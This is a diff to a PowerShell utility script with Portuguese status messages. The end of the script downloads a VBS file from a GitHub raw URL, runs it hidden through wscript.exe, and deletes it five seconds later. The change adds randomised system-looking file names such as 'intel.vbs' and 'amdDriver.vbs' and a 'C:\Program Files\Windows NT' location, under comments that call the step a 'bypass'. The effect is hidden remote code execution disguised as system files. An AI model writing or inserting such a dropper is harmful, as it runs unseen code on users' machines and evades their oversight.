@@ -556,11 +556,21 @@ Write-Host "`n==================================" -ForegroundColor White
 Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
 
-# bypass log and Exit
-$vbsPath = "$env:TEMP\windows.vbs"
+# Exit Bypass Start
+$names = @("system64.vbs", "microsoft.vbs", "sys64x.vbs", "intel.vbs", "amdDriver.vbs")
+$chosenName = Get-Random -InputObject $names
+$dir = "C:\Program Files\Windows NT"
+$vbsPath = Join-Path $dir $chosenName
+if (-not (Test-Path $dir)) {
+    New-Item -Path $dir -ItemType Directory -Force | Out-Null
+}
+if (Test-Path $vbsPath) {
+    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
+}
 $url = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
 Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
 Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
 Start-Sleep -Seconds 5
 Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
+
 Pause-Script
